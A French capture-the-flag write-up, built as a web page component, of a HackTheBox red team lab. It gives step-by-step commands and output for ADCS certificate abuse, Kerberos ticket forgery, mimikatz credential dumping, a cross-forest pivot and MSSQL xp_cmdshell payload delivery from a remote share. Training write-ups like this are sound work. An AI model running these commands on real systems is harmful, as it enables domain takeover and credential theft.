import Image from "next/image";
import Link from "next/link";
import { Terminal, Database, Shield, Key, Lock, Network, Users } from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { RevealFlagBlock } from "@/components/RevealFlag";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Mythical | Writeup ProLab HTB | 0xbbuddha",
  description:
    "Writeup du ProLab HackTheBox Mythical (Red Team Operator I). C2 Mythic, ESC4->ESC1 avec bypass du Full Enforcement Mode, pivot cross-forest et abus MSSQL TRUSTWORTHY jusqu'à SYSTEM.",
};

export default function WriteupMythicalPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <header className="mb-8 border-b border-border pb-6">
        <div className="flex items-start justify-between gap-6">
          <div className="min-w-0 flex-1">
            <nav className="mb-3 flex flex-wrap items-center gap-1 text-xs text-muted-foreground">
              <Link href="/" className="transition-colors hover:text-foreground">README</Link>
              <span className="text-muted-foreground/40">›</span>
              <Link href="/writeups" className="transition-colors hover:text-foreground">Writeups</Link>
              <span className="text-muted-foreground/40">›</span>
              <span className="text-foreground/70">Mythical</span>
            </nav>
            <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Writeup ProLab</p>
            <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Mythical</h1>
            <p className="mt-3 text-sm leading-7 text-muted-foreground">
              Petit ProLab orienté red team. On démarre déjà avec un beacon Mythic actif sur un poste interne,
              suite à une campagne de social engineering simulée. Au programme : opérations C2, ADCS (ESC4-&gt;ESC1),
              contournement du Full Enforcement Mode, pivot cross-forest via une clé de confiance et abus MSSQL
              jusqu&apos;à SYSTEM.
            </p>
            <div className="mt-4 flex flex-wrap gap-x-5 gap-y-1">
              {[
                { label: "Platform", value: "HackTheBox ProLabs" },
                { label: "Tier", value: "Red Team Operator I" },
                { label: "Domaines", value: "mythical-us.vl / mythical-eu.vl" },
                { label: "Flags", value: "Backup / Certified / Mythical Master" },
                { label: "Date", value: "2026-06-16" },
              ].map((s) => (
                <div key={s.label} className="text-xs text-muted-foreground">
                  <span className="text-muted-foreground/60">{s.label}: </span>
                  <span>{s.value}</span>
                </div>
              ))}
            </div>
          </div>
          <Image
            src="/ic-mythical-overview.png"
            alt="Mythical ProLab"
            width={160}
            height={105}
            className="hidden shrink-0 rounded-xl sm:block"
            priority
          />
        </div>
      </header>

      <article className="mt-8 space-y-10">

        {/* ── 1. CONTEXTE & ACCÈS C2 ───────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Contexte et accès au C2
          </h2>
          <p className="text-muted-foreground">
            Mythical Inc. interdit toute sortie de données du réseau interne : le red team a donc déployé son
            propre serveur <strong>Mythic C2</strong> à l&apos;intérieur du périmètre. Un employé a exécuté un payload
            simulant une attaque de social engineering réussie, ce qui donne un beacon <strong>Apollo</strong> déjà
            actif sur un poste du domaine <strong>mythical-us.vl</strong>. Le point d&apos;entrée fourni est l&apos;interface
            web Mythic elle-même, pas un shell.
          </p>
          <CodeBlock title="Accès initial">
{`https://10.13.38.32:7443
mythic_admin : wG4jmjNcEcfmzv3QbEcJdSVTDEjCnX`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Une fois loggué, je liste les callbacks via l&apos;API GraphQL de Mythic. Le plus récent (host
            <strong> DC01</strong>, utilisateur <strong>Momo.Ayase</strong>) vient de checker-in. Je le tasque avec
            un simple <code className="rounded bg-muted px-1">whoami</code> pour confirmer la prise de contrôle.
          </p>
          <CodeBlock title="GraphQL : callbacks actifs">
{`query { callback { id agent_callback_id host user ip os last_checkin } }

→ id 18, host DC01, user MYTHICAL-US\\Momo.Ayase, agent Apollo`}
          </CodeBlock>
          <CodeBlock title="Résultat (whoami)" result>
{`whoami: success
Local Identity: MYTHICAL-US\\Momo.Ayase
Impersonation Identity: MYTHICAL-US\\Momo.Ayase`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Pour piloter le C2 plus efficacement que des appels GraphQL bruts, j&apos;utilise <strong>mythic-cli</strong>
            (client tiers en ligne de commande) une fois la configuration pointée sur le serveur du lab.
          </p>
          <CodeBlock title="Configuration mythic-cli">
{`mythic-cli config-set --server "https://10.13.38.32:7443/" --no-verify-ssl
mythic-cli login -u mythic_admin --password 'wG4jmjNcEcfmzv3QbEcJdSVTDEjCnX'`}
          </CodeBlock>
        </section>

        {/* ── 2. BUTIN DÉJÀ EN PLACE ───────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            2. Énumération AD, partage rsync et flag Backup
          </h2>
          <p className="text-muted-foreground">
            Premier réflexe sur un beacon AD : charger <strong>SharpHound</strong> en mémoire via
            <code className="rounded bg-muted px-1 mx-1">register_assembly</code> puis l&apos;exécuter avec
            <code className="rounded bg-muted px-1 mx-1">execute_assembly</code> pour cartographier le domaine
            sans toucher le disque.
          </p>
          <CodeBlock title="Collecte BloodHound en mémoire">
{`register_assembly SharpHound.exe
execute_assembly SharpHound.exe -c All`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            En fouillant la machine en parallèle, je tombe sur une installation <strong>cwrsync</strong> dans
            <code className="rounded bg-muted px-1 mx-1">C:\_admin\cwrsync\bin</code>, configurée pour parler à
            un serveur rsync interne sans authentification. Je liste le module exposé puis je synchronise tout
            son contenu en local.
          </p>
          <CodeBlock title="Énumération du module rsync exposé">
{`rsync.exe --list-only rsync://192.168.25.1`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`drwxr-xr-x          4,096 2026/06/10 09:12:01 .
-rw-r--r--         48,221 2026/06/10 09:12:01 20251212_BloodHound.zip
-rw-r--r--          2,184 2026/06/10 09:12:01 it.kdbx
→ module "mythical" accessible en lecture, sans credentials`}
          </CodeBlock>
          <CodeBlock title="Synchronisation complète du module">
{`rsync -av rsync://192.168.25.1/mythical C:\\bl4ckarch`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le coffre <strong>it.kdbx</strong> récupéré est en format KeePass 4 :
            <code className="rounded bg-muted px-1 mx-1">keepass2john</code> ne gère pas ce format, il faut
            <strong> keepass4brute</strong>.
          </p>
          <CodeBlock title="Crack du coffre KeePass">
{`keepass4brute it.kdbx ~/Downloads/rockyou.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] Password found for it.kdbx
→ credentials du compte domjoin extraites du coffre, ainsi que le premier flag du lab`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Backup" result>
{`REDACTED`}
          </RevealFlagBlock>
          <p className="mt-2 text-muted-foreground">
            Premier butin engrangé : creds <strong>domjoin</strong> + outillage <strong>StandIn</strong>,
            <strong> Certify</strong> et <strong>Rubeus</strong> déjà uploadés sur la cible. Je repars de là pour
            enchaîner sur l&apos;ADCS.
          </p>
        </section>

        {/* ── 3. ESC4 → ESC1 ────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            3. ADCS : ESC4 sur le template Machine, conversion en ESC1
          </h2>
          <p className="text-muted-foreground">
            <strong>Certify.exe find /vulnerable</strong> pointe le template <strong>Machine</strong> comme
            vulnérable à <strong>ESC4</strong> : domjoin a des droits d&apos;écriture sur ses ACLs. J&apos;utilise
            <strong> StandIn</strong> pour impersonner domjoin puis reconfigurer le template afin d&apos;activer
            <code className="rounded bg-muted px-1 mx-1">ENROLLEE_SUPPLIES_SUBJECT</code> (le client peut choisir le
            SAN du certificat) et d&apos;ouvrir l&apos;enrollment à <strong>Domain Users</strong>. Le template devient
            alors exploitable comme un <strong>ESC1</strong> classique.
          </p>
          <CodeBlock title="Détection">
{`Certify.exe find /vulnerable`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`[!] Vulnerable Certificates Templates :
    CA Name                : dc01.mythical-us.vl\\mythical-us-DC01-CA
    Template Name           : Machine
    [!] Vulnerable ACL      : ESC4 (WriteOwner / WriteDacl for domjoin)`}
          </CodeBlock>
          <CodeBlock title="Reconfiguration du template (ESC4 → ESC1)">
{`StandIn.exe --ADCS --filter Machine --ess --add
StandIn.exe --ADCS --filter Machine --enroll --add`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Une fois le template modifié, je demande un certificat avec un <strong>altname</strong> usurpant
            Administrator.
          </p>
          <CodeBlock title="Requête de certificat">
{`Certify.exe request /ca:dc01.mythical-us.vl\\mythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl`}
          </CodeBlock>
        </section>

        {/* ── 4. BYPASS FULL ENFORCEMENT MODE ──────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            4. KDC_ERR_CERTIFICATE_MISMATCH : contourner le Full Enforcement Mode
          </h2>
          <p className="text-muted-foreground">
            Avec ce premier certificat, <strong>Rubeus asktgt</strong> échoue systématiquement avec
            <code className="rounded bg-muted px-1 mx-1">KDC_ERR_CERTIFICATE_MISMATCH</code>. Symptôme classique du
            <strong> Full Enforcement Mode</strong> (KB5014754) : depuis le durcissement du strong certificate
            mapping, le KDC rejette tout certificat PKINIT qui usurpe une autre identité (SAN=Administrator) s&apos;il
            ne porte pas l&apos;extension de sécurité SID (OID <code className="rounded bg-muted px-1">1.3.6.1.4.1.311.25.2</code>).
            Je vérifie la valeur de registre pour confirmer le diagnostic.
          </p>
          <CodeBlock title="Vérification du mode d'enforcement">
{`(Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc" -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`StrongCertificateBindingEnforcement : 2  (Full Enforcement)
Build : 20348.3692 (Windows Server 2022, à jour)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            La version de <strong>Certify.exe</strong> présente sur la cible ne sait pas injecter cette extension.
            Il faut un build récent (fork GhostPack ou équivalent) qui supporte le flag <code className="rounded bg-muted px-1">/sid:</code>
            sur la commande <code className="rounded bg-muted px-1">request</code>. En attendant qu&apos;il soit déposé
            sur la machine, je récupère le SID d&apos;Administrator par une requête LDAP directe.
          </p>
          <CodeBlock title="Récupération du SID Administrator">
{`$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Administrator,CN=Users,DC=mythical-us,DC=vl")
(New-Object System.Security.Principal.SecurityIdentifier($de.Properties["objectSid"].Value, 0)).Value`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`S-1-5-21-614429729-4048209472-3755682007-500`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Une fois le bon binaire en place, je relance la requête en injectant l&apos;extension SID manuellement
            dans la CSR.
          </p>
          <CodeBlock title="Requête avec extension SID">
{`Certify.exe request /ca:dc01.mythical-us.vl\\mythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl /sid:S-1-5-21-614429729-4048209472-3755682007-500`}
          </CodeBlock>
          <CodeBlock title="Vérification de l'extension dans le certificat émis" result>
{`X509v3 extensions:
    1.3.6.1.4.1.311.25.2 (Microsoft NTDS CA Security Extension)
        SidExtension : S-1-5-21-614429729-4048209472-3755682007-500`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Conversion en PFX, upload sur la cible, puis nouvelle tentative Rubeus, cette fois avec
            <code className="rounded bg-muted px-1 mx-1">/getcredentials</code> pour extraire directement le hash NTLM
            après l&apos;échange PKINIT.
          </p>
          <CodeBlock title="Demande de TGT + extraction du hash NTLM">
{`Rubeus.exe asktgt /user:Administrator /certificate:C:\\Users\\Momo.Ayase\\cert.pfx /ptt /nowrap /getcredentials`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] TGT request successful!
[*] base64(ticket.kirbi) injected (ptt)
[*] NTLM           : C583EF48C5ED66C727AECB6FAB87AC12`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            La chaîne <strong>ESC4→ESC1</strong> avec extension SID fonctionne : le Full Enforcement Mode est
            contourné, j&apos;ai le hash NTLM d&apos;Administrator et un TGT injecté dans le cache Kerberos courant.
          </p>
        </section>

        {/* ── 5. SYSTEM DC01 ────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            5. SYSTEM sur DC01 via pass-the-hash loopback et flag Certified
          </h2>
          <p className="text-muted-foreground">
            Le module <strong>pth</strong> natif d&apos;Apollo échoue (accès LSASS refusé, le process courant
            n&apos;est pas élevé). Plutôt que de m&apos;acharner sur l&apos;injection locale, j&apos;utilise le hash NTLM pour
            un mouvement latéral réseau via <strong>Invoke-SMBExec</strong> (toolkit Invoke-TheHash de Kevin
            Robertson), ciblé en loopback sur 127.0.0.1 pour créer un service distant qui s&apos;exécute en SYSTEM.
          </p>
          <CodeBlock title="Import du module">
{`powershell_import Invoke-SMBExec.ps1`}
          </CodeBlock>
          <CodeBlock title="Exécution">
{`Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username administrator -Hash C583EF48C5ED66C727AECB6FAB87AC12 -Command "C:\\programdata\\google\\update.exe"`}
          </CodeBlock>
          <CodeBlock title="Résultat (nouveau callback)" result>
{`[+] callback id=19, host=DC01, integrity_level=4 (SYSTEM)
Local Identity: NT AUTHORITY\\SYSTEM`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            SYSTEM sur le premier contrôleur de domaine via la chaîne ESC4→ESC1, c&apos;est le deuxième flag du
            lab qui tombe : <strong>Certified</strong>, lisible sur le bureau de ce callback.
          </p>
          <RevealFlagBlock title="Flag : Certified" result>
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── 6. CLÉ DE CONFIANCE ──────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            6. Extraction de la clé de confiance inter-domaine
          </h2>
          <p className="text-muted-foreground">
            Le scénario implique un second domaine, <strong>mythical-eu.vl</strong>. Depuis SYSTEM sur DC01,
            <strong> mimikatz</strong> permet de dumper la relation de confiance entre les deux forêts.
          </p>
          <CodeBlock title="Commande">
{`mimikatz.exe "lsadump::trust /patch" exit`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[domain] mythical-eu.vl
[direction] outbound | inbound
[type] WINDOWS_ACTIVE_DIRECTORY
* [in] e98143ec508822a15e3a41742b7a6cba (RC4)
* [out] ...

→ mythical-eu.vl trust mythical-us.vl (confiance unidirectionnelle)`}
          </CodeBlock>
        </section>

        {/* ── 7. PIVOT CROSS-DOMAIN ────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Users className="size-5 text-primary" />
            7. Pivot cross-domain vers mythical-eu.vl
          </h2>
          <p className="text-muted-foreground">
            Avec la clé RC4 de la confiance, je demande un TGT inter-royaume pour le compte de confiance du
            domaine et l&apos;injecte directement dans le cache Kerberos.
          </p>
          <CodeBlock title="Commande">
{`Rubeus.exe asktgt /user:mythical-us$ /domain:mythical-eu.vl /rc4:e98143ec508822a15e3a41742b7a6cba /nowrap /ptt`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] TGT request successful!
[*] base64(ticket.kirbi) injected (ptt)
ServiceName : krbtgt/mythical-eu.vl`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Ce ticket suffit pour énumérer le domaine distant via LDAP. <strong>Get-ADUser</strong> contre
            <code className="rounded bg-muted px-1 mx-1">dc02.mythical-eu.vl</code> liste les comptes intéressants.
          </p>
          <CodeBlock title="Commande">
{`Get-ADUser -Filter * -Server dc02.mythical-eu.vl | Select-Object SamAccountName | Format-Table -AutoSize`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`svc_ldap
svc_sql
root`}
          </CodeBlock>
        </section>

        {/* ── 8. CREDENTIALS HARDCODÉES ────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            8. Credentials hardcodées dans un binaire partagé
          </h2>
          <p className="text-muted-foreground">
            Un <code className="rounded bg-muted px-1">net view</code> contre DC02 révèle un partage
            <strong> dev</strong> qui contient <code className="rounded bg-muted px-1">getusers.exe</code>, un
            petit outil interne. Je le copie localement puis le décompile avec <strong>monodis</strong> pour
            inspecter l&apos;IL.
          </p>
          <CodeBlock title="Découverte et récupération du binaire">
{`net view \\\\dc02.mythical-eu.vl
dir \\\\dc02.mythical-eu.vl\\dev
copy \\\\dc02.mythical-eu.vl\\dev\\getusers.exe C:\\Windows\\Temp\\getusers.exe`}
          </CodeBlock>
          <CodeBlock title="Décompilation et recherche de credentials">
{`monodis --output=getusers.il getusers.exe
grep -A5 'ldstr "LDAP' getusers.il`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`ldstr "LDAP://dc02.mythical-eu.vl"
ldstr "svc_ldap"
ldstr "osaRXWkDf2y5SGh5"`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Mot de passe en clair dans le code pour <strong>svc_ldap</strong>. Comme souvent dans ce genre de
            scénario, le compte de service SQL réutilise le même mot de passe. Je le confirme en forgeant un
            nouveau token.
          </p>
          <CodeBlock title="Vérification (make_token)">
{`make_token mythical-eu\\svc_sql osaRXWkDf2y5SGh5`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Successfully impersonated NT AUTHORITY\\SYSTEM
Impersonation Identity: mythical-eu\\svc_sql`}
          </CodeBlock>
        </section>

        {/* ── 9. ABUS MSSQL TRUSTWORTHY ────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            9. Abus MSSQL : msdb TRUSTWORTHY vers sysadmin
          </h2>
          <p className="text-muted-foreground">
            <strong>svc_sql</strong> n&apos;est pas sysadmin sur l&apos;instance, mais c&apos;est
            <strong> db_owner</strong> sur <strong>msdb</strong>, et cette base a le bit <strong>TRUSTWORTHY</strong>
            activé. C&apos;est la combinaison classique pour s&apos;auto-promouvoir sysadmin via une procédure stockée
            créée avec <code className="rounded bg-muted px-1">EXECUTE AS OWNER</code>.
          </p>
          <CodeBlock title="Vérification des droits">
{`SELECT is_srvrolemember('sysadmin');                          -- 0
SELECT is_member('db_owner') FROM msdb..sysusers;              -- 1
SELECT is_trustworthy_on FROM sys.databases WHERE name='msdb'; -- 1`}
          </CodeBlock>
          <CodeBlock title="Élévation vers sysadmin">
{`USE msdb;
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS
EXEC sp_addsrvrolemember 'MYTHICAL-EU\\svc_sql', 'sysadmin';
EXEC sp_privesc;`}
          </CodeBlock>
          <CodeBlock title="Activation xp_cmdshell" result>
{`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

→ sysadmin confirmé, xp_cmdshell opérationnel (nt service\\mssql$sqlexpress)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Je prépare la livraison du payload Apollo : un partage SMB sur DC01 héberge le binaire, et
            <code className="rounded bg-muted px-1 mx-1">xp_cmdshell</code> sur DC02 le copie puis l&apos;exécute via
            un chemin UNC.
          </p>
          <CodeBlock title="Livraison via xp_cmdshell">
{`EXEC master..xp_cmdshell 'copy \\\\dc01.mythical-us.vl\\bl4ckarch\\update.exe C:\\Users\\Public\\update.exe';
EXEC master..xp_cmdshell 'C:\\Users\\Public\\update.exe';`}
          </CodeBlock>
          <CodeBlock title="Résultat (nouveau callback DC02)" result>
{`[+] callback id=20, host=DC02, process=MSSQL$SQLEXPRESS, integrity_level=3 (High)`}
          </CodeBlock>
        </section>

        {/* ── 10. SYSTEM DC02 ──────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            10. SYSTEM sur DC02 : SeImpersonatePrivilege
          </h2>
          <p className="text-muted-foreground">
            Le process MSSQL hérite de <strong>SeImpersonatePrivilege</strong>, exploitable par les classiques
            attaques de type <em>potato</em>. Le module <code className="rounded bg-muted px-1">printspoofer</code>
            natif d&apos;Apollo n&apos;est pas chargé sur cet agent (<code className="rounded bg-muted px-1">Task &apos;printspoofer&apos; not loaded</code>),
            il faut un binaire <strong>PrintSpoofer</strong> compilé à part pour passer la couche EDR du lab et
            spoofer un token SYSTEM via le service spouleur d&apos;impression.
          </p>
          <CodeBlock title="Confirmation des privilèges">
{`getprivs`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Impersonation identity enabled privileges:
SeImpersonatePrivilege`}
          </CodeBlock>
          <CodeBlock title="Exécution PrintSpoofer">
{`upload PrintSpoofer.exe
shell PrintSpoofer.exe -c "C:\\Users\\Public\\update.exe"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[+] Named pipe listening...
[+] CreateProcessAsUser() OK
→ nouveau callback DC02, integrity_level=4 (SYSTEM)`}
          </CodeBlock>
        </section>

        {/* ── 11. FLAG MYTHIC MASTER ───────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            11. Flag final : Mythical Master
          </h2>
          <p className="text-muted-foreground">
            SYSTEM sur DC02, donc sur les deux contrôleurs de domaine du lab. Pour le troisième et dernier flag,
            je relance <strong>mimikatz</strong> avec <code className="rounded bg-muted px-1">sekurlsa::logonpasswords</code>
            pour vider la mémoire LSASS. <strong>WDigest</strong> est activé sur cette machine : le mot de passe
            de <strong>root</strong> traîne en clair dans les credentials mises en cache.
          </p>
          <CodeBlock title="Commande">
{`mimikatz.exe "sekurlsa::logonpasswords" exit`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : root
Domain            : MYTHICAL-EU
        * Username : root
        * Domain   : MYTHICAL-EU
        * Password : (cleartext, WDigest)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le mot de passe en clair de <strong>root</strong> est le dernier flag du lab.
          </p>
          <RevealFlagBlock title="Flag : Mythical Master" result>
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── RECAP ─────────────────────────────────────────────────────── */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>Accès</strong> : beacon Apollo déjà actif (Momo.Ayase@DC01) via C2 Mythic interne</li>
            <li><strong>Flag Backup</strong> : module rsync exposé sans auth → it.kdbx → creds domjoin (keepass4brute)</li>
            <li><strong>ESC4→ESC1</strong> : template Machine reconfiguré (StandIn) → certificat altname=Administrator</li>
            <li><strong>Bypass Full Enforcement</strong> : extension SID (OID 1.3.6.1.4.1.311.25.2) injectée dans la CSR → contourne KDC_ERR_CERTIFICATE_MISMATCH → NTLM Administrator</li>
            <li><strong>Flag Certified</strong> : SYSTEM DC01 via Invoke-SMBExec en pass-the-hash loopback (PTH local refusé, LSASS protégé)</li>
            <li><strong>Trust</strong> : mimikatz lsadump::trust /patch → clé RC4 mythical-eu.vl ↔ mythical-us.vl</li>
            <li><strong>Pivot cross-forest</strong> : Rubeus asktgt inter-royaume → énumération AD sur mythical-eu.vl</li>
            <li><strong>Credentials hardcodées</strong> : getusers.exe sur le partage dev (DC02) → mot de passe svc_ldap réutilisé par svc_sql</li>
            <li><strong>MSSQL TRUSTWORTHY</strong> : msdb db_owner + TRUSTWORTHY → EXECUTE AS OWNER → sysadmin → xp_cmdshell</li>
            <li><strong>SYSTEM DC02</strong> : SeImpersonatePrivilege exploité via PrintSpoofer</li>
            <li><strong>Flag Mythical Master</strong> : sekurlsa::logonpasswords sur DC02 → mot de passe cleartext de root (WDigest)</li>
          </ul>
        </section>

      </article>
    </div>
  );
}

